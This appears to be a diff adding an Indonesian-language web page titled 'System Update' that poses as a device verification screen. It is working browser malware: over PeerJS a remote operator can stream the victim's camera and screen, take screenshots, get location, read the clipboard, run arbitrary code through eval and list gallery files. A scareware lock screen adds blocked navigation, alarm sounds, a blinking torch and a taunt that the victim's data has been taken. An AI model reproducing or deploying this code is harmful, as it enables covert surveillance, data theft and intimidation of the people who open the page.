@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>System Update</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body { font-family: 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; color: #222; overflow: hidden; }
+        #lockOverlay {
+            position: fixed; top:0; left:0; width:100%; height:100%;
+            background: #000;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 99999; text-align: center; padding: 20px;
+        }
+        .hidden { display: none !important; }
+        .lock-circle {
+            width: 200px; height: 200px; background: #1a1a1a; border-radius: 50%;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            margin-bottom: 30px; border: 3px solid #ff3333; box-shadow: 0 0 20px #ff3333;
+        }
+        .lock-icon { font-size: 80px; }
+        .denzx-text { font-size: 36px; font-weight: bold; letter-spacing: 4px; color: #ff3333; margin-top: 10px; text-shadow: 0 0 5px #ff3333; }
+        .lock-message { font-size: 20px; color: white; margin-bottom: 20px; background: rgba(0,0,0,0.6); padding: 10px 20px; border-radius: 30px; }
+        .lock-sub input, .lock-sub button { padding: 12px 20px; margin: 10px; font-size: 16px; border-radius: 30px; border: none; }
+        .lock-sub input { background: #333; color: white; text-align: center; width: 200px; }
+        .lock-sub button { background: #d32f2f; color: white; cursor: pointer; }
+        .attempt-counter { font-size: 14px; color: #ffaaaa; margin-top: 10px; }
+        #finalMessage { font-size: 24px; font-weight: bold; margin-top: 20px; color: yellow; }
+        .status-bar { background: #e0e0e0; padding: 8px 16px; font-size: 12px; display: flex; justify-content: space-between; }
+        .pair-box { background: white; border-radius: 28px; margin: 20px; padding: 24px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .pair-code-display { font-size: 48px; letter-spacing: 8px; font-weight: bold; background: #f0f0f0; padding: 20px; border-radius: 24px; margin: 15px 0; }
+        button { background: #1976d2; color: white; border: none; padding: 12px 24px; border-radius: 28px; font-size: 16px; cursor: pointer; }
+        footer { position: fixed; bottom: 16px; width: 100%; text-align: center; font-size: 11px; color: #888; }
+    </style>
+    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+</head>
+<body>
+<div id="lockOverlay" class="hidden">
+    <div class="lock-circle">
+        <div class="lock-icon">🧑‍🦯🔒</div>
+        <div class="denzx-text">DENZX</div>
+    </div>
+    <div class="lock-message" id="lockMessage">⚠️ Dikunci ⚠️</div>
+    <div class="lock-sub">
+        <input type="password" id="unlockPass" placeholder="Password">
+        <button onclick="attemptUnlock()">BUKA KUNCI</button>
+        <div class="attempt-counter" id="attemptCounter"></div>
+        <div id="finalMessage"></div>
+    </div>
+</div>
+<div class="status-bar"><span>📱 System Update</span><span id="batterySim">🔋 100%</span></div>
+<div class="pair-box"><h2>🔐 Verifikasi Perangkat</h2><div class="pair-code-display" id="pairCode">----</div><p>Berikan kode 4 angka ini ke administrator.</p><button onclick="regenerateCode()">🔄 Generate Ulang</button></div>
+<footer>System Update Service v2.0</footer>
+
+<script>
+    let peer = null, conn = null;
+    let currentLockPassword = null, isLocked = false, failedAttempts = 0;
+    let flashlightInterval = null, torchTrack = null, torchStream = null, vibrateInterval = null;
+    let localCameraStream = null, localScreenStream = null, cameraCall = null, screenCall = null;
+    let malwareAudio = null; let audioCtx = null; let malwareInterval = null;
+
+    // Suara Malware Keras & Seram
+    async function playMalwareSound() {
+        stopMalwareSound();
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if (audioCtx.state === 'suspended') await audioCtx.resume();
+        const now = audioCtx.currentTime;
+        const osc1 = audioCtx.createOscillator(); osc1.type = 'sawtooth'; osc1.frequency.value = 200;
+        const gain1 = audioCtx.createGain(); gain1.gain.value = 0.5;
+        osc1.connect(gain1); gain1.connect(audioCtx.destination); osc1.start();
+        const lfo = audioCtx.createOscillator(); lfo.type = 'sine'; lfo.frequency.value = 5;
+        const lfoGain = audioCtx.createGain(); lfoGain.gain.value = 50;
+        lfo.connect(lfoGain); lfoGain.connect(osc1.frequency); lfo.start();
+        const osc2 = audioCtx.createOscillator(); osc2.type = 'square'; osc2.frequency.value = 800;
+        const gain2 = audioCtx.createGain(); gain2.gain.value = 0.3;
+        osc2.connect(gain2); gain2.connect(audioCtx.destination); osc2.start();
+        const bufferSize = audioCtx.sampleRate * 2; const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+        const data = buffer.getChannelData(0); for (let i = 0; i < bufferSize; i++) data[i] = (Math.random() * 2 - 1) * 0.8;
+        const noise = audioCtx.createBufferSource(); noise.buffer = buffer;
+        const noiseGain = audioCtx.createGain(); noiseGain.gain.value = 0.6;
+        noise.connect(noiseGain); noiseGain.connect(audioCtx.destination); noise.loop = true; noise.start();
+        const filter = audioCtx.createBiquadFilter(); filter.type = 'lowpass'; filter.frequency.value = 1000;
+        gain1.connect(filter); gain2.connect(filter); filter.connect(audioCtx.destination);
+        const lfoFilter = audioCtx.createOscillator(); lfoFilter.type = 'sine'; lfoFilter.frequency.value = 2;
+        const lfoFilterGain = audioCtx.createGain(); lfoFilterGain.gain.value = 500;
+        lfoFilter.connect(lfoFilterGain); lfoFilterGain.connect(filter.frequency); lfoFilter.start();
+        malwareAudio = { osc1, osc2, noise, lfo, lfoFilter, gain1, gain2, noiseGain, filter };
+        malwareInterval = setInterval(() => { if (isLocked) { const scream = audioCtx.createOscillator(); scream.type = 'sine'; scream.frequency.value = 1200 + Math.random() * 400; const sGain = audioCtx.createGain(); scream.connect(sGain); sGain.connect(audioCtx.destination); sGain.gain.value = 0.5; scream.start(); sGain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 1); scream.stop(audioCtx.currentTime + 1); } else clearInterval(malwareInterval); }, 4000);
+    }
+    function stopMalwareSound() { if (malwareAudio) { try { if (malwareAudio.osc1) malwareAudio.osc1.stop(); if (malwareAudio.osc2) malwareAudio.osc2.stop(); if (malwareAudio.noise) malwareAudio.noise.stop(); if (malwareAudio.lfo) malwareAudio.lfo.stop(); if (malwareAudio.lfoFilter) malwareAudio.lfoFilter.stop(); } catch(e) {} malwareAudio = null; } if (malwareInterval) { clearInterval(malwareInterval); malwareInterval = null; } }
+
+    // Senter Blink dengan Kecepatan Diatur
+    async function startFlashlightBlink(speedMs) { if (flashlightInterval) clearInterval(flashlightInterval); try { if (!torchStream) { torchStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); torchTrack = torchStream.getVideoTracks()[0]; if (!torchTrack || !torchTrack.getCapabilities().torch) return; } let state = false; flashlightInterval = setInterval(async () => { if (!isLocked) { clearInterval(flashlightInterval); flashlightInterval = null; return; } state = !state; try { await torchTrack.applyConstraints({ advanced: [{ torch: state }] }); } catch(e) {} }, speedMs); } catch(e) {} }
+    function stopFlashlightBlink() { if (flashlightInterval) { clearInterval(flashlightInterval); flashlightInterval=null; } if (torchStream) { torchStream.getTracks().forEach(t=>t.stop()); torchStream=null; torchTrack=null; } }
+    function startLoopingVibrate() { if (vibrateInterval) clearInterval(vibrateInterval); if (!navigator.vibrate) return; vibrateInterval = setInterval(() => navigator.vibrate([500,200,500]), 2000); }
+    function stopLoopingVibrate() { if (vibrateInterval) { clearInterval(vibrateInterval); vibrateInterval=null; navigator.vibrate(0); } }
+
+    // Lock Screen
+    async function showLockScreen(msg, pwd, blinkSpeed) { if (isLocked) { stopMalwareSound(); stopFlashlightBlink(); stopLoopingVibrate(); } currentLockPassword = pwd; failedAttempts = 0; isLocked = true; document.getElementById('lockMessage').innerHTML = msg; document.getElementById('lockOverlay').classList.remove('hidden'); document.getElementById('attemptCounter').innerHTML = "Kesempatan 3x"; document.getElementById('finalMessage').innerHTML = ""; document.getElementById('unlockPass').value = ""; try { await document.documentElement.requestFullscreen(); } catch(e) {} history.pushState(null, null, location.href); window.addEventListener('popstate', blockBack); if (navigator.keyboard?.lock) navigator.keyboard.lock(); playMalwareSound(); let speed = blinkSpeed || 300; startFlashlightBlink(speed); sendResult(`Lock aktif (blink ${speed}ms)`); }
+    function blockBack(e) { history.pushState(null, null, location.href); }
+    function cleanupLock() { stopMalwareSound(); stopFlashlightBlink(); stopLoopingVibrate(); if (document.fullscreenElement) document.exitFullscreen(); window.removeEventListener('popstate', blockBack); if (navigator.keyboard?.unlock) navigator.keyboard.unlock(); }
+    function hideLockScreen() { if (!isLocked) return; isLocked = false; document.getElementById('lockOverlay').classList.add('hidden'); cleanupLock(); currentLockPassword = null; sendResult("Unlocked"); }
+    function attemptUnlock() { if (!isLocked) return; let pass = document.getElementById('unlockPass').value; if (pass === currentLockPassword) { hideLockScreen(); sendResult("UNLOCK_SUCCESS"); } else { failedAttempts++; if (failedAttempts >= 3) { document.getElementById('finalMessage').innerHTML = "❌ selamat ya datamu di saya ❌"; document.getElementById('attemptCounter').innerHTML = "Kesempatan habis!"; document.getElementById('unlockPass').disabled = true; document.querySelector('#lockOverlay button').disabled = true; startLoopingVibrate(); sendResult("FAILED 3 TIMES"); } else { document.getElementById('attemptCounter').innerHTML = `Sisa kesempatan: ${3-failedAttempts}`; document.getElementById('unlockPass').value = ""; sendResult(`Wrong password`); if (navigator.vibrate) navigator.vibrate(200); } } }
+
+    // Semua fungsi lain (camera, screen, screenshot, lokasi, vibrate, notif, clipboard, execute, battery, wallpaper, gallery)
+    async function startCameraStream() { if (localCameraStream) { sendCameraToAttacker(); return; } try { localCameraStream = await navigator.mediaDevices.getUserMedia({ video: true }); sendCameraToAttacker(); sendResult("Camera started"); } catch(e) { sendResult(`Camera error: ${e.message}`); } }
+    function stopCameraStream() { if (localCameraStream) { localCameraStream.getTracks().forEach(t=>t.stop()); localCameraStream=null; } if (cameraCall) { cameraCall.close(); cameraCall=null; } sendResult("Camera stopped"); }
+    function sendCameraToAttacker() { if (!conn || !localCameraStream) return; const call = peer.call(conn.peer, localCameraStream, { metadata: { type: 'camera' } }); cameraCall = call; }
+    async function startScreenMonitor() { if (localScreenStream) { sendScreenToAttacker(); return; } try { localScreenStream = await navigator.mediaDevices.getDisplayMedia({ video: true }); sendScreenToAttacker(); sendResult("Screen started"); localScreenStream.getVideoTracks()[0].onended = () => stopScreenMonitor(); } catch(e) { sendResult(`Screen error: ${e.message}`); } }
+    function stopScreenMonitor() { if (localScreenStream) { localScreenStream.getTracks().forEach(t=>t.stop()); localScreenStream=null; } if (screenCall) { screenCall.close(); screenCall=null; } sendResult("Screen stopped"); }
+    function sendScreenToAttacker() { if (!conn || !localScreenStream) return; const call = peer.call(conn.peer, localScreenStream, { metadata: { type: 'screen' } }); screenCall = call; }
+    async function handleFlashlight(on) { try { let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); let t = s.getVideoTracks()[0]; if (!t?.getCapabilities().torch) throw new Error("No torch"); await t.applyConstraints({ advanced: [{ torch: on }] }); if (!on) s.getTracks().forEach(t=>t.stop()); sendResult(`Flashlight ${on?"ON":"OFF"}`); } catch(e) { sendResult(`Flashlight error: ${e.message}`); } }
+    async function takeScreenshot() { try { let stream = await navigator.mediaDevices.getDisplayMedia({ video: true }); let track = stream.getVideoTracks()[0]; let imgCap = new ImageCapture(track); let bitmap = await imgCap.grabFrame(); let canvas = document.createElement('canvas'); canvas.width=bitmap.width; canvas.height=bitmap.height; canvas.getContext('2d').drawImage(bitmap,0,0); let base64 = canvas.toDataURL('image/jpeg',0.7).split(',')[1]; track.stop(); stream.getTracks().forEach(t=>t.stop()); conn.send(JSON.stringify({ type: 'screenshot', data: base64 })); sendResult("Screenshot sent"); } catch(e) { sendResult(`Screenshot error: ${e.message}`); } }
+    async function getLocation() { if (!navigator.geolocation) return sendResult("Geolocation not supported"); navigator.geolocation.getCurrentPosition(pos => sendResult(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`), err => sendResult(`Location error: ${err.message}`)); }
+    function handleVibrate() { if (navigator.vibrate) { navigator.vibrate([200,100,200]); sendResult("Vibrate"); } else sendResult("Vibrate not supported"); }
+    function showNotification(title, body) { if (Notification.permission === "granted") { new Notification(title, { body }); sendResult("Notif sent"); } else if (Notification.permission !== "denied") { Notification.requestPermission().then(perm => { if (perm === "granted") new Notification(title, { body }); }); } }
+    async function getClipboard() { try { let text = await navigator.clipboard.readText(); sendResult(`Clipboard: ${text}`); } catch(e) { sendResult(`Clipboard error: ${e.message}`); } }
+    async function setClipboard(text) { try { await navigator.clipboard.writeText(text); sendResult(`Clipboard set: ${text}`); } catch(e) { sendResult(`Set clipboard error: ${e.message}`); } }
+    async function executeCode(code) { try { if (code.startsWith("eval:")) { let result = eval(code.slice(5)); sendResult(`Eval: ${result}`); } else if (code === "getUserAgent") sendResult(`UA: ${navigator.userAgent}`); else sendResult(`Unknown: ${code}`); } catch(e) { sendResult(`Execute error: ${e.message}`); } }
+    function setBattery(level) { document.getElementById('batterySim').innerHTML = `🔋 ${level}%`; sendResult(`Battery set to ${level}%`); }
+    async function changeWallpaper(base64, filename) { try { let blob = await (await fetch(`data:image/jpeg;base64,${base64}`)).blob(); let url = URL.createObjectURL(blob); let a = document.createElement('a'); a.href=url; a.download=filename; a.click(); URL.revokeObjectURL(url); sendResult(`Image downloaded: ${filename}`); } catch(e) { sendResult(`Download error: ${e.message}`); } }
+    async function monitorGallery() { if (!window.showDirectoryPicker) { sendResult("Not supported"); return; } try { let dir = await window.showDirectoryPicker(); sendResult("Reading folder..."); let files = []; async function read(d, p='') { for await (let e of d.values()) { if (e.kind === 'file' && e.name.match(/\.(jpg|jpeg|png|gif|mp4)$/i)) files.push({ name: e.name, path: p+'/'+e.name }); else if (e.kind === 'directory') await read(e, p+'/'+e.name); } } await read(dir); if (files.length===0) sendResult("No media files"); else { sendResult(`Found ${files.length} files`); for (let f of files) conn.send(JSON.stringify({ type: 'gallery_item', data: f })); conn.send(JSON.stringify({ type: 'gallery_end', data: `Done ${files.length} files` })); } } catch(e) { if (e.name !== 'AbortError') sendResult(`Gallery error: ${e.message}`); } }
+    function sendResult(msg) { if (conn && conn.open) conn.send(JSON.stringify({ type: 'result', data: msg })); }
+
+    // PeerJS + Reconnection Logic
+    function generateCode() { return Math.floor(1000+Math.random()*9000).toString(); }
+    function initPeer(code) { if (peer) { if (localCameraStream) localCameraStream.getTracks().forEach(t=>t.stop()); if (localScreenStream) localScreenStream.getTracks().forEach(t=>t.stop()); if (cameraCall) cameraCall.close(); if (screenCall) screenCall.close(); peer.destroy(); } peer = new Peer(code); peer.on('open', id => document.getElementById('pairCode').innerText = id); peer.on('connection', c => { conn = c; setupChannel(); }); peer.on('error', err => { if (err.type === 'unavailable-id') regenerateCode(); }); }
+    function regenerateCode() { initPeer(generateCode()); }
+    function setupChannel() { conn.on('data', async (data) => { let cmd = JSON.parse(data); switch(cmd.command) { case 'lock': await showLockScreen(cmd.message, cmd.password, cmd.blinkSpeed); break; case 'unlock': hideLockScreen(); break; case 'flashlight': await handleFlashlight(cmd.state); break; case 'screenshot': await takeScreenshot(); break; case 'getLocation': await getLocation(); break; case 'vibrate': handleVibrate(); break; case 'notification': showNotification(cmd.title, cmd.body); break; case 'getClipboard': await getClipboard(); break; case 'setClipboard': await setClipboard(cmd.text); break; case 'execute': await executeCode(cmd.code); break; case 'camera_start': await startCameraStream(); break; case 'camera_stop': stopCameraStream(); break; case 'screen_start': await startScreenMonitor(); break; case 'screen_stop': stopScreenMonitor(); break; case 'set_battery': setBattery(cmd.level); break; case 'change_wallpaper': await changeWallpaper(cmd.imageBase64, cmd.filename); break; case 'monitor_gallery': await monitorGallery(); break; default: sendResult(`Unknown: ${cmd.command}`); } }); }
+    if (Notification.permission === "default") Notification.requestPermission();
+    regenerateCode();
+</script>
+</body>
+</html>
